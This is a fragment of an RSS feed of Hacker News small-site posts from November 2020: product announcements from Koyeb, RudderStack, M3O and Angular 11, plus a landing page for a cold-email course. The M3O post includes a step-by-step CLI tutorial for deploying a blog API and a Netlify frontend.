</code></pre><p>All catalog functions can be easily forked, modified to your needs and deployed thanks to the GitHub integration.</p><p>This post extensively covers all of the platform's new features. If you want to read about complete examples, head to our new <a target="_blank" rel="noopener" href="http://koyeb.com/tutorials">tutorials section</a> where we cover complete end-to-end use-cases:</p><ul><li><a target="_blank" rel="noopener" href="https://www.koyeb.com/tutorials/image-search-app-with-koyeb-aws-rekognition-and-algolia">How to build an application with automatic labeling and indexation of medias using Koyeb, AWS Rekognition and Algolia</a></li><li><a target="_blank" rel="noopener" href="https://www.koyeb.com/tutorials/watermark-images-uploaded-to-your-backblaze-b2-bucket-automatically">How to automatically watermark images uploaded to a Backblaze B2 bucket</a></li><li><a target="_blank" rel="noopener" href="https://www.koyeb.com/tutorials/process-digitalocean-spaces-bucket-images-to-generate-thumbnail">How to process DigitalOcean Spaces images to generate thumbnails</a></li></ul><p>Some of you already spotted some of the new features under development in our documentation: cron to schedule recurring jobs, HTTP event sources, and our CLI are all under construction and scheduled for a release in the coming weeks!</p><p><strong>We're happy to provide 1000 hours of compute, 1TB of storage, and 5TB of bandwidth per month for free until the end of the year! <a target="_blank" rel="noopener" href="https://app.koyeb.com/auth/signup">Sign up now</a> ;)</strong></p><p>As always, we're available through our <a target="_blank" rel="noopener" href="https://app.koyeb.com/support"><strong>support channel</strong></a>, <a target="_blank" rel="noopener" href="https://slack.koyeb.com/"><strong>Slack</strong></a> or through our integrated instant messaging system if you have a question or want to share feedback.</p><p>We'…</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://koyeb.com/blog/announcing-the-koyeb-serverless-engine-docker-containers-and-continuous-deployment-of-functions">http://koyeb.com/blog/announcing-the-koyeb-serverless-engine-docker-containers-and-continuous-deployment-of-functions</a></em></p>]]>
            </description>
            <link>http://koyeb.com/blog/announcing-the-koyeb-serverless-engine-docker-containers-and-continuous-deployment-of-functions</link>
            <guid isPermaLink="false">hacker-news-small-sites-25070416</guid>
            <pubDate>Thu, 12 Nov 2020 14:47:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Cold Email for Interesting People]]>
            </title>
            <description>
<![CDATA[
Score 14 | Comments 6 (<a href="https://news.ycombinator.com/item?id=25069895">thread link</a>) | @philipkiely
<br/>
November 12, 2020 | https://philipkiely.com/cefip/ | <a href="https://web.archive.org/web/*/https://philipkiely.com/cefip/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  
<div>
    <!--Intro-->
    <div>
        <p><img src="https://philipkiely.com/assets/img/cefip_hero_vertical.jpg" alt="Cold Email for Interesting People">
        </p>
    </div>
    <div>
        <h2>Cold Email for Interesting People</h2>
        <p>Whether you want a new job, to meet your heroes, a feature on someone's show, or a unique opportunity that the public doesn't know about, the best way to get it is simple: just ask for what you want. I built an international career from the middle of Iowa, thousands miles away from the action. If you're like me and don't have tons of connections, you'll need to cold-contact people who you've never met to get things started. This course equips you with specific tactics for writing successful cold emails and encourages you to take your shot.</p>
        <br>
        <h5>Video Introduction</h5>
        <p>In a short video, I discuss fundamental concepts relating to cold email including social proof, overcoming
            objections, and formulating a specific ask. <i>16 Minutes</i>.</p>
        <br>
        <h5>Handbook</h5>
        <p>The handbook walks step-by-step through the process of deciding to write a cold email, figuring out who to email, finding their contact information, writing a compelling first message, and closing the conversation. <i>31 Pages</i>.</p>
        <br>
        <h5>Six Annotated Examples</h5>
        <p>Go behind the scenes of my cold email success. I've annotated six examples from the past two years to share with you. Each example includes one or two emails, the context, and the
        payoff. For each email, I go through line-by-line and discuss the impact of the words and phrases. <i>48 Pages</i>.</p>
        <br>
    </div>
</div>
<hr>
<div>
    <div>
        <div>
            <div>
                <h2>Get Cold Email for Interesting People Today!</h2>
                
                <p>16 5-star ratings | Pay what you want | $0 Minimum</p>
                <p>Sahil Lavingia: "Cold emails work, when they're sent by interesting people."</p>
                <p><a href="https://gum.co/cefip/">Click Here to Buy Now on Gumroad</a>
            </p></div>
        </div>
    </div>
    <div>
        <blockquote data-theme="dark">
            <p lang="en" dir="ltr">Cold emails work, when they're sent by interesting people.</p>— Sahil (@shl) <a href="https://twitter.com/shl/status/1306575128277299201?ref_src=twsrc%5Etfw">September 17, 2020</a>
        </blockquote>
        
    </div>
</div>
<hr>
<!--ATA SECTION-->
<div>
    
    <div>
        <p><img src="https://philipkiely.com/assets/img/SeatedPortraitCropped.jpg" alt="Philip Kiely">
        </p>
    </div>
    <div>
        <div>
            <p>Hi, I'm Philip Kiely. I run <a href="https://pkandc.com/">Philip Kiely &amp; Company</a>, which means that I am many
                things to many people. Most often, I’m <a href="https://philipkiely.com/essays/gumroad_hom.html">running marketing</a> at <a href="https://gumroad.com/">Gumroad</a>, selling copies of <a href="https://philipkiely.com/wfsd">Writing for Software Developers</a>,
                working on the next big thing, fixing bugs of my own creation, finding and delighting clients, or running payroll
                through Venmo like a Real Business Person.</p>
            <p>You can find me around the internet, especially <a href="https://twitter.com/philip_kiely">Twitter</a>, <a href="https://news.ycombinator.com/user?id=philipkiely">Hacker News</a>, or <a href="https://www.indiehackers.com/philipkiely">Indie Hackers</a>. I write <a href="https://philipkiely.com/essays">essays</a>, <a href="https://philipkiely.com/essays">tutorials</a>, and <a href="https://philipkiely.com/notes">notes</a> on my own site and <a href="https://philipkiely.com/notes/posts.html">various other publications</a>. You may have heard me on <a href="https://www.se-radio.net/2020/09/episode-426-philip-kiely-on-writing-for-software-developers/">IEEE’s
                    Software Engineering Radio</a> or <a href="https://philipkiely.com/notes/appearances.html">another show</a>. My professional hobbies
                include appearing on podcasts and panels, sending cold emails, pretending that I can read a 10-K, and tweeting
                about business. I also enjoy playing D&amp;D, practicing martial arts, and reading whatever is nearby.</p>
        </div>
    </div>
</div>
<hr>
<!--FAQ SECTION-->
<div>
    <div>
        
        <h5>What is a cold email?</h5>
        <p>A cold email is sending an email to someone who you do not know, or do not know well. The "cold" in cold email doesn't
        refer to the tone (which should generally be warm, friendly, and professional), but rather to the lack of previous
        relationship.</p>
        <br>
        <h5>Am I an interesting person?</h5>
        <p>I think so! Whether or not someone is interesting is quite situational. For example, Tom Brady wouldn't be interested in
        hearing from me with ideas for plays to run, but a developer advocate might be interested in hearing from me with ideas
        for technical content. Being interesting isn't so much an attribute but an action, so anyone can be interesting to the right person in the right situation!</p>
        <br>
        <h5>Who is this course not for?</h5>
        <p>This isn't a course about copywriting for mass emails or other bulk outreach. It isn't about generating leads or making
        tons of LinkedIn connections with some boilerplate message. It is about thinking deeply about how to connect with
        individuals about mutually interesting things.</p>
        <br>
    </div>
    <div>
        <h5>How much should I pay?</h5>
        <p><i>Cold Email for Interesting People</i> is a pay-what-you-want product. You can pay any amount, even zero dollars, but I'd appreciate it if you paid for the product for both of our benefits. Paying for the product helps me run my business and makes you more invested in the content. You can also download for free, see if you like it, and then buy it again if you found it valuable.</p>
        <p>I did pay-what-you-want without a minimum to achieve <a href="https://en.wikipedia.org/wiki/Price_discrimination#First_degree">perfect price discrimination</a> and avoid <a href="https://en.wikipedia.org/wiki/Anchoring_(cognitive_bias)">price anchoring</a>. But, if you really want guidance, let's say that if twenty bucks isn't a big deal for you, you should pay about that much, but if twenty bucks is a big deal for you, you should pay five or grab it for free and not feel bad either way. If you know me personally, you get it for free.</p>
        <br>
        <h5>Is there a refund policy?</h5>
        <p>I have a 30-day no-questions-asked refund policy. If you don't like your purchase, let me know and I will refund your
            money. Because the product is pay-what-you-want, if you think you'd ask for a refund, I'd rather you just download for free because that saves us both time.</p>
        <br>
        <h5>What if I have another question?</h5>
        <p>Send me an email at <a href="mailto:philip@kiely.xyz">philip@kiely.xyz</a>.</p>
        <br>
    </div>
</div>
<!--END FAQ SECTION-->
<hr>
<div>
    <div>
        <div>
            <div>
                <h2>Get Cold Email for Interesting People Today!</h2>
                
                <p>16 5-star ratings | Pay what you want | $0 Minimum</p>
                <p>Watch the Video Introduction on YouTube</p>
                <p><a href="https://gum.co/cefip/">Click Here to Buy Now on
                    Gumroad</a>
            </p></div>
        </div>
    </div>
    <p>
        <iframe width="100%" height="315" src="https://www.youtube.com/embed/E4_WFCF4zLs" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
    </p>
</div>
<hr>
</div></div>]]>
            </description>
            <link>https://philipkiely.com/cefip/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25069895</guid>
            <pubDate>Thu, 12 Nov 2020 14:02:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Launching RudderStack Cloud Free Tier]]>
            </title>
            <description>
<![CDATA[
Score 15 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25069882">thread link</a>) | @soumyadeb
<br/>
November 12, 2020 | https://rudderstack.com/blog/start-building-a-better-cdp-for-free-with-rudderstack-cloud-free/ | <a href="https://web.archive.org/web/*/https://rudderstack.com/blog/start-building-a-better-cdp-for-free-with-rudderstack-cloud-free/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
                                    <figure>
                        <img src="https://3od2tt2mz35tibwwgb36eab1-wpengine.netdna-ssl.com/wp-content/uploads/2020/11/freetier.blog_.rs_.png" alt="" title="freetier.blog.rs">                    </figure>
                                
                                
                <section>
                    <div>
                        
<p>Today, we launched <a href="https://app.rudderlabs.com/signup?type=freetrial">RudderStack Cloud Free</a>, a no time limit, no credit card required, completely free tier of RudderStack Cloud. The driving force behind this is simple: we want you to try RudderStack, and RudderStack Cloud Free makes it easier than ever to do that. You receive the same great experience you get with RudderStack Cloud Pro, with the only limitation being a cap of 500,000 events per month (that’s roughly 10,000 monthly active users for most sites and apps). We are confident that if you try RudderStack, you will find value in it and love it.</p>











<h2>RudderStack’s Warehouse-First Approach is Better Than Other CDPs</h2>











<p>The whole point of your customer data platform (CDP) is to eliminate the customer data silos that are invariably created through your company’s use of a variety of common, popular marketing, sales, and product technologies. Every CDP <em>claims</em> to do this, and modern CDPs, like Segment, actually do this well, but they all have one glaring flaw in their approach. They create another customer data silo, because they store your data. That means you have a third-party data warehouse for your customer data in addition to your own data warehouse, where you store all of your historical data… including another copy of your customer data.</p>



<blockquote><p><strong>RudderStack’s warehouse-first approach fixes this flaw.</strong>&nbsp;</p></blockquote>



<p>RudderStack does not persist any of your customer data. RudderStack builds your CDP on your data warehouse, with support for cloud data warehouses like <a href="https://aws.amazon.com/redshift/">Amazon Redshift</a>, <a href="https://cloud.google.com/bigquery">Google BigQuery</a>, and <a href="https://www.snowflake.com/">Snowflake</a>. No more paying your CDP vendor a premium to store your data. No more concerns about whether your CDP vendor is keeping your customer data private and secure. No more crossing your fingers and hoping the BI, ML, or AI tools you already use and love work with your CDP. No more reliance on your CDPs black box for complex functions like identity stitching.</p>











<h2>RudderStack is Built for Developers</h2>











<p>The team that owns your data warehouse and data infrastructure should own your customer data stack too. At pretty much every company, that team primarily consists of developers. So we built RudderStack to be easy to use for devs.</p>



<div><p>RudderStack’s features are built API-first, so they can easily fit into your existing development processes. It offers <a href="https://docs.rudderstack.com/rudderstack-sdk-integration-guides">11 SDKs</a> in addition to <a href="https://docs.rudderstack.com/sources">source integrations</a> with popular cloud-based customer tools including <a href="https://looker.com/">Looker</a> and <a href="https://customer.io/">Customer.io</a>, so you can instrument and start ingesting customer data from all of your digital touchpoints. RudderStack also offers connections to over <a href="https://docs.rudderstack.com/destinations">60 destinations</a>, so you can route your customer data to all of the systems that need it&nbsp; – including popular event-streaming platforms like <a href="https://kafka.apache.org/">Apache Kafka</a>, data warehouses like Snowflake, cloud tools like <a href="https://amplitude.com/">Amplitude</a>, <a href="https://www.appsflyer.com/">AppsFlyer</a>, and many more.</p><p>RudderStack is <a href="https://docs.rudderstack.com/how-to-guides/rudderstack-migration-guide">fully compatible</a> with Segment’s API too. So, if you have already instrumented your digital touchpoints with Segment, you don’t have to go through the toil of reinstrumenting with RudderStack. Just update the configuration on your Segment SDKs and you’re done.</p><p>RudderStack is also open source (visit <a href="https://github.com/rudderlabs">RudderStack on GitHub</a>). So if you ever need to augment or modify your RudderStack, you can, and then, hopefully, you’ll contribute that back to the project, so others benefit from your work too.</p></div>











<h2>Start Building a Better CDP With RudderStack</h2>











<p>Start building a better, warehouse-first CDP that delivers complete, unified data to every part of your marketing and analytics stack. Sign up for <a href="https://app.rudderlabs.com/signup?type=freetrial">RudderStack Cloud Free</a> today.<br>Join our <a href="https://resources.rudderstack.com/join-rudderstack-slack">Slack</a> to chat with our team, check out our open source repos on <a href="https://github.com/rudderlabs">GitHub</a>, and follow us on social: <a href="https://twitter.com/RudderStack">Twitter</a>, <a href="https://www.linkedin.com/company/rudderlabs/">LinkedIn</a>, <a href="https://dev.to/rudderstack">dev.to</a>, <a href="https://rudderstack.medium.com/">Medium</a>, <a href="https://www.youtube.com/channel/UCgV-B77bV_-LOmKYHw8jvBw">YouTube</a>.</p>
                    </div>
                </section>
            </article><div>
                <div>
                                        <p><img src="https://3od2tt2mz35tibwwgb36eab1-wpengine.netdna-ssl.com/wp-content/uploads/2020/11/Gavin-Headshot-20200907-08-Square.png">
                    </p>
                    <p><span>Gavin</span>
                                                                            <span>Johnson</span>
                                                                    </p>
                    
                </div>
                <p>
                                            Product Marketer at RudderStack. 
Ex-PMM at New Relic &amp; AT&amp;T. Ex-consultant at Deloitte. Ex-sys admin. (Sometimes) Ex-developer.                                    </p>
            </div></div>]]>
            </description>
            <link>https://rudderstack.com/blog/start-building-a-better-cdp-for-free-with-rudderstack-cloud-free/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25069882</guid>
            <pubDate>Thu, 12 Nov 2020 14:01:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Netlify for the frontend, Micro for the backend]]>
            </title>
            <description>
<![CDATA[
Score 142 | Comments 61 (<a href="https://news.ycombinator.com/item?id=25068782">thread link</a>) | @chuhnk
<br/>
November 12, 2020 | https://blog.m3o.com/2020/11/12/netlify-for-the-frontend-micro-for-the-backend.html | <a href="https://web.archive.org/web/*/https://blog.m3o.com/2020/11/12/netlify-for-the-frontend-micro-for-the-backend.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">

    <article>

        

<!--         <header class="post-header">
            <a id="blog-logo" href="">
                
                    <span class="blog-title">M3O</span>
                
            </a>
        </header> -->

        <!-- <span class="post-meta">
            <time datetime="2020-11-12">12 Nov 2020</time>
            
        </span> -->

        <!-- <h1 class="post-title">Netlify for the frontend, Micro for the backend</h1> -->

        <section>
            <p><br>
Today Netlify has emerged as the modern platform for rapidly building web applications without having to worry about anything beyond your code. We at <a href="https://m3o.com/">Micro</a>
are users of Netlify and have bought into this phenomenal experience. What’s more Netlify has demonstrated to us a breakdown in the classic web architecture 
stack which previously combined web and api concerns in a single place. As we moved through a tiered architecture frontend had not been given anything more 
than hints on how to consume dynamic content from the backend. Today we’re all calling this the <a href="https://jamstack.org/">Jamstack</a>.</p>

<h2 id="jamstack">Jamstack</h2>

<p><img src="https://d33wubrfki0l68.cloudfront.net/b7d16f7f3654fb8572360301e60d76df254a323e/385ec/img/svg/architecture.svg"></p>
<center><i><small>Credit jamstack.org</small></i></center>
<p><br>
The jamstack rethinks the frontend architecture by separating the concerns of static and dynamic content and pushing for the dynamic side to be consumed 
through APIs and services. Effectively, Netlify embracing this model has tried to build microservices for the frontend and moved towards a unification 
of consumption of services via APIs on the backend. It’s clear this is the architecture of the future for the web and the majority of cloud services 
will be built and consumed soley as APIs.</p>

<p>The one question we’ve really been seeing a lot though is “What’s Netlify for the backend?”. Many of those frontend users building Jamstack apps on 
Netlify are looking to where they can find and build these APIs. It seems even Netlify’s current answer has been, “go host something on heroku”. I think 
in 2020 this just doesn’t fly. If the frontend is being reimagined then the same has to happen on the backend to cater for that use.</p>

<h2 id="netlify-for-the-backend">Netlify for the Backend</h2>

<p><img src="https://blog.m3o.com/assets/images/netlify.png"></p>

<p><a href="https://m3o.com/"><strong>M3O</strong></a> is a platform for cloud services development. The fastest way to build APIs without managing the infrastructure. M3O makes use of 
<a href="https://micro.mu/"><strong>Micro</strong></a>, an open source platform for microservices development. What we get from Micro is a powerful framework for building, running 
and consuming APIs as microservices. What M3O brings to the table is Micro as a Service, a fully managed platform for building microservices. Write services 
in Go and gRPC on the backend, expose them dynamically via HTTP API to be consumed by the frontend. M3O looks to fill that gap in the market for frontend 
devs. M3O is Netlify for the backend.</p>

<h2 id="m3o-features">M3O Features</h2>

<p>As we mentioned, M3O is a fully managed <a href="https://micro.mu/">Micro</a> services platform. What does that mean? Micro provides the building blocks for 
writing, running and consuming microservices. From source to running and beyond. M3O takes that and hosts it so you can just get on with writing 
APIs without worrying about the underlying infrastructure.</p>

<p>Here’s a few of the key features and services:</p>

<ul>
  <li><strong>Microservices development</strong> using <a href="https://grpc.io/">gRPC</a> and protobuf code generation</li>
  <li><strong>Service runtime</strong> and process lifecycle management</li>
  <li><strong>Source to running</strong> builds without need for CI/CD</li>
  <li><strong>Authentication and authorization</strong> for access control and user management</li>
  <li><strong>Dynamic configuration</strong> and secrets management</li>
  <li><strong>PubSub messaging</strong> and event streaming</li>
  <li><strong>Service discovery</strong> and secure networking</li>
  <li><strong>Key-value storage</strong> and persistent CRUD</li>
  <li><strong>Automatic HTTP routing</strong> with path based resolution</li>
  <li><strong>Identity aware proxy</strong> for remote access and gRPC-web apps</li>
  <li><strong>Public API gateway</strong> and TLS support by default</li>
  <li><strong>Public and private repos</strong> support including  github, gitlab and bitbucket</li>
</ul>

<p>M3O is a feature complete platform for microservices development from generating service templates on your local machine through to writing and running 
it in the cloud all using the same Micro CLI experience. M3O exposes HTTPS urls for you dynamically by default. So every service automatically becomes 
an API as soon as you deploy it.</p>

<p>Where a new development model has emerged for the frontend, we think its dictating the “headless” paradigm shift for the backend and M3O wants to be there 
to host all of those APIs as Micro services.</p>

<h2 id="api-first">API First</h2>

<p><img src="https://dev-to-uploads.s3.amazonaws.com/i/0znow24kgpu2dp3zg60n.png"></p>

<p>We are seeing the emergence of APIs as the dominant form factor for cloud services, from AWS all the way through to Twilio and Stripe. What’s even more 
compelling is while this model has emerged in the past few years, we are only really just getting started. It’s our belief that in a decade from now 
some of the most important companies will be API first yet strangely there is no platform to caters to this form of development.</p>

<p>Twilio, Stripe and others have all had to build out the infrastructure for their API first approach. We think as many more companies go down this path 
the tools must emerge to empower them, not just at the compute layer but by providing the higher level abstractions required. That’s the goal of M3O.</p>

<p>But don’t just take our word for it. We’re going to walk you through a demonstration of the value proposition so you can see for yourself just how 
powerful Micro and M3O are.</p>

<h2 id="building-a-backend">Building a backend</h2>

<p>You’re going to be writing and deploying APIs in minutes rather than hours or days! No more dealing with infrastructure on the 
backend, just as Netlify empowered devs on the frontend, we’re doing the same for a new generation of developers on the backend.</p>

<p>Let’s walk you through it. We’ll deploy an existing Micro blog service with this demo frontend on Netlify: <a href="https://loving-goodall-44ee08.netlify.app/">https://loving-goodall-44ee08.netlify.app/</a>. But first let’s start with signup.</p>

<h3 id="signup-to-m3o">Signup to M3O</h3>

<p>First you start by signing up to M3O and registering for a free account in our Dev environment.</p>

<p>Start by installing micro</p>

<div><div><pre><code>curl <span>-fsSL</span> https://install.m3o.com/micro | /bin/bash
</code></pre></div></div>

<p>For those wary of curl into bash, you can view it first <a href="https://install.m3o.com/micro">https://install.m3o.com/micro</a>.</p>

<p>Signup is purely CLI based for now so just issue the following command and follow the steps</p>



<p>Once you’re done you should have an account on M3O and be automatically logged in.</p>

<h3 id="run-helloworld">Run Helloworld</h3>

<p>Validate that by running helloworld.</p>

<div><div><pre><code>micro run github.com/micro/services/helloworld
</code></pre></div></div>

<p>Check it’s running and try call it via the CLI.</p>

<div><div><pre><code><span># check the status</span>
micro status

<span># call helloworld</span>
micro call helloworld <span>--name</span><span>=</span><span>"Alice"</span>
</code></pre></div></div>

<p>OK now we get to the more interesting part. Call it via the HTTP API that’s dynamically generated for you.</p>

<div><div><pre><code><span># get your namespace</span>
<span>NAMESPACE</span><span>=</span><span>$(</span>micro user namespace<span>)</span>

<span># curl your unique url</span>
curl <span>"https://</span><span>$NAMESPACE</span><span>.m3o.com/helloworld?name=Alice"</span>
</code></pre></div></div>

<p>If alls good, we can move on to running something a bit more interesting.</p>

<h3 id="deploying-a-dynamic-blog-backend">Deploying a dynamic blog backend</h3>

<p>We’re going to deploy a headless CMS, or better known as a Blog API.</p>

<p>On the open source side, Micro maintains some reusable example services we can all play with and contribute back to. 
You can check them out at <a href="https://github.com/micro/services">github.com/micro/services</a>. Let’s bootstrap the blog 
using a couple of them.</p>

<p>Because Micro is all about microservices development, we’ve decomposed the blog API into posts, comments and tags. 
Right now we’ll focus on posts and tags. You can find the code in <a href="https://github.com/micro/services/tree/master/blog">https://github.com/micro/services/tree/master/blog</a>.</p>

<p>Deploying these is super simple.</p>

<div><div><pre><code><span># run the posts service</span>
micro run github.com/micro/services/blog/posts

<span># run the tags service</span>
micro run github.com/micro/services/blog/tags
</code></pre></div></div>

<p>Check they’re running using <code>micro status</code>. You should see the status progress through starting, building and running. 
If you want to see logs or anything related just do <code>micro logs posts</code> and the same for any other service by name.</p>

<h3 id="write-a-post-on-the-cli">Write a post on the CLI</h3>

<p>Once services are running they become immediately callable via the CLI as dynamic commands.</p>

<p>Save a quick post:</p>

<div><div><pre><code>micro posts save <span>--id</span><span>=</span>1 <span>--title</span><span>=</span><span>"My first post"</span> <span>--content</span><span>=</span><span>"This is pretty epic"</span>
</code></pre></div></div>

<p>List posts:</p>



<p>The same calls can be made over the API too, just have to know your namespace:</p>

<h3 id="call-it-via-the-http-api">Call it via the HTTP API</h3>

<p>Now here’s where it gets cool and more importantly what you’ll be calling from your frontend apps 
running on Netlify. First grab your namespace like earlier.</p>

<div><div><pre><code><span>$ </span>micro user namespace
random-example-namespace
</code></pre></div></div>

<p>Now just curl it like any other api</p>

<div><div><pre><code><span>$ </span>curl <span>-H</span> <span>"Micro-Namespace: random-example-namespace"</span> https://api.m3o.dev/posts/query
<span>{</span>
  <span>"posts"</span>: <span>[</span>
    <span>{</span>
      <span>"id"</span>: <span>"1"</span>,
      <span>"title"</span>: <span>"My first post"</span>,
      <span>"slug"</span>: <span>"my-first-post"</span>,
      <span>"content"</span>: <span>"This is pretty epic"</span>
    <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>The generic <code>api.m3o.dev</code> url requires us to pass in our namespace so we query our own service but 
every namespace also gets its own unique URL so you don’t have to worry about this in your frontend 
code. Just compose namespace + m3o.dev as <code>random-example-namespace.m3o.dev</code>.</p>

<div><div><pre><code><span>$ </span>curl https://random-example-namespace.m3o.dev/posts/query
<span>{</span>
  <span>"posts"</span>: <span>[</span>
    <span>{</span>
      <span>"id"</span>: <span>"1"</span>,
      <span>"title"</span>: <span>"My first post"</span>,
      <span>"slug"</span>: <span>"my-first-post"</span>,
      <span>"content"</span>: <span>"This is pretty epic"</span>
    <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>That’s it! We now have the backend for our frontend running on M3O.</p>

<p>Let’s deploy the sample frontend to Netlify just for kicks.</p>

<h2 id="deploying-the-frontend-to-netlify">Deploying the frontend to Netlify</h2>

<p>The frontend is a simple angular app we’ve put together to validate the premise:</p>

<p><strong>Netlify for the frontend, Micro for the backend</strong></p>

<p>You can find the code in <a href="https://github.com/m3o/blog-frontend">github.com/m3o/blog-frontend</a> but 
we’ll walk you through the install now. The deploy settings for the site hosted under 
<a href="https://loving-goodall-44ee08.netlify.app/">loving-goodall-44ee08.netlify.app</a> are as follows:</p>

<h3 id="build-settings">Build settings</h3>

<center>
<img src="https://blog.m3o.com/assets/images/deploysettings.png">
</center>

<p><br>
You can copy the below settings for ease of use. Where you see ‘concert-celtic-uncover’ replace it with your namespace from <code>micro user namespace</code> on the CLI. 
We need this to know what backend API to call.</p>

<div><div><pre><code>Repository        github.com/m3o/blog-frontend
Base directory    Not set
Build command     sed -i 's/micro/concert-celtic-uncover/g' ./src/environments/environment.prod.ts &amp;&amp; ng build --prod &amp;&amp; cp ./src/assets/_redirects ./dist/blog-frontend
Publish directory dist/blog-frontend
</code></pre></div></div>

<p>As you can see, it’s the original <code>m3o/blog-frontend</code> being deployed in the example, but in your case <code>m3o</code> will be replaced with your fork. 
This is because Netlify asks for the permissions to the repo.</p>

<p>The build command is a bit involved, here is what it’s doing:</p>

<div><div><pre><code><span># Replace the micro namespace with your own</span>
<span>namespace</span><span>=</span><span>$(</span>micro user namespace<span>)</span>

<span>sed</span> <span>-i</span> <span>"s/micro/</span><span>$namespace</span><span>/g"</span> ./src/environments/environment.prod.ts

<span># It's an angular app, so we have to ng build</span>
ng build <span>--prod</span>

<span># Single page …</span></code></pre></div></div></section></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.m3o.com/2020/11/12/netlify-for-the-frontend-micro-for-the-backend.html">https://blog.m3o.com/2020/11/12/netlify-for-the-frontend-micro-for-the-backend.html</a></em></p>]]>
            </description>
            <link>https://blog.m3o.com/2020/11/12/netlify-for-the-frontend-micro-for-the-backend.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25068782</guid>
            <pubDate>Thu, 12 Nov 2020 11:44:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Angular 11]]>
            </title>
            <description>
<![CDATA[
Score 148 | Comments 198 (<a href="https://news.ycombinator.com/item?id=25068668">thread link</a>) | @amitport
<br/>
November 12, 2020 | https://blog.angular.io/version-11-of-angular-now-available-74721b7952f7 | <a href="https://web.archive.org/web/*/https://blog.angular.io/version-11-of-angular-now-available-74721b7952f7">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><div><div><div><div><div><p><a href="https://medium.com/@markathompson?source=post_page-----74721b7952f7--------------------------------" rel="noopener"><img alt="Mark Techson" src="https://miro.medium.com/fit/c/96/96/1*2hqK0rVXWghtk_RLFx33oA.jpeg" width="48" height="48"></a></p></div></div></div></div><figure><div role="button" tabindex="0"><div><div><p><img alt="Photo of a Torch Ginger by Jules Kremer" src="https://miro.medium.com/max/2368/0*55kr1t601sp22pkE" width="1184" height="1091" srcset="https://miro.medium.com/max/552/0*55kr1t601sp22pkE 276w, https://miro.medium.com/max/1104/0*55kr1t601sp22pkE 552w, https://miro.medium.com/max/1280/0*55kr1t601sp22pkE 640w, https://miro.medium.com/max/1400/0*55kr1t601sp22pkE 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*55kr1t601sp22pkE?q=20"></p></div></div></div><figcaption>Photo of a Torch Ginger by Jules Kremer</figcaption></figure><p id="1feb"><strong>Welcome to the Angular version 11 release.</strong></p><p id="1877">Version 11.0.0 is here and we’ve got some great updates for Angular developers everywhere. This release has updates across the platform including the framework, the CLI and components. Let’s dive in!</p><h2 id="1182">Updates on Operation Byelog</h2><p id="593b">When we shared <a href="https://angular.io/guide/roadmap" rel="noopener">Angular’s Roadmap</a>, one of the items was Operation Byelog where we committed to putting a significant engineering effort towards triaging issues and PRs until we have a clear understanding of the broader community needs. We can now report that the original goal is complete! We’ve triaged all the issues in all three of the monorepos and will continue this as an ongoing effort as new issues get reported.</p><p id="bc06">This is our commitment: Going forward all new issues reported will be triaged within 2 weeks.</p><p id="2104">In the process, we resolved a few <a href="https://github.com/angular/angular/issues/12842" rel="noopener">popular</a> <a href="https://github.com/angular/angular/issues/18469" rel="noopener">issues</a> in the <a href="https://github.com/angular/angular/issues/13011" rel="noopener">router</a> and <a href="https://github.com/angular/angular/issues/14542" rel="noopener">forms</a>.</p><p id="a1cd">Also, we’ve closed the <a href="https://github.com/angular/angular/issues/11405" rel="noopener"><em>third most popular issue</em></a><em>!</em></p><p id="5773">Now, we’re planning the next steps to support the Angular community. We’ll continue triaging and fixing issues, and work towards improving our processes for accepting community contributions.</p><h2 id="4683">Automatic Inlining of Fonts</h2><p id="6a67">To make your apps even faster by speeding up their <a href="https://web.dev/first-contentful-paint/" rel="noopener">first contentful paint</a>, we’re introducing automatic font inlining. During compile time Angular CLI will download and inline fonts that are being used and linked in the application. We enable this by default in apps built with version 11. All you need to do to take advantage of this optimization is update your app!</p><h2 id="124e">Component Test Harnesses</h2><p id="78d2">In Angular v9 we introduced Component Test Harnesses. They provide a robust and legible API surface to help with testing Angular Material components. It gives developers a way to interact with Angular Material components using the supported API during testing.</p><p id="2932">Releasing with version 11, we have harnesses for all of the components! Now developers can create more robust test suites.</p><p id="3e07">We’ve also included performance improvements and new APIs. The <em>parallel</em> function makes working with asynchronous actions in your tests easier by allowing developers to run multiple asynchronous interactions with components in parallel. The <em>manualChangeDetection</em> function gives developers access to finer grained control of change detection by disabling automatic change detection in unit tests.</p><p id="752c">For more details and examples of these APIs and other new features, be sure to check out the <a href="http://material.angular.io/cdk/test-harnesses/overview" rel="noopener">documentation for Angular Material</a> Test Harnesses!</p><h2 id="173a">Improved Reporting and Logging</h2><p id="968c">We’ve made changes to the builder phase reporting to make it even more helpful during development. We are bringing in new CLI output updates to make logs and reports easier to read.</p><figure><div><div><p><img alt="Screenshot of angular CLI output nicely formatted into columns." src="https://miro.medium.com/max/1214/0*-dCa80651cnfbjpX" width="607" height="355" srcset="https://miro.medium.com/max/552/0*-dCa80651cnfbjpX 276w, https://miro.medium.com/max/1104/0*-dCa80651cnfbjpX 552w, https://miro.medium.com/max/1214/0*-dCa80651cnfbjpX 607w" sizes="607px" data-old-src="https://miro.medium.com/max/60/0*-dCa80651cnfbjpX?q=20"></p></div></div><figcaption>Improved CLI output formatting</figcaption></figure><h2 id="970e">Updated Language Service Preview</h2><p id="650a">The Angular Language Service provides helpful tools to make development with Angular productive and fun. The current version of the language service is based on View Engine and today we’re giving a sneak peek of the Ivy-based language service. The updated language service 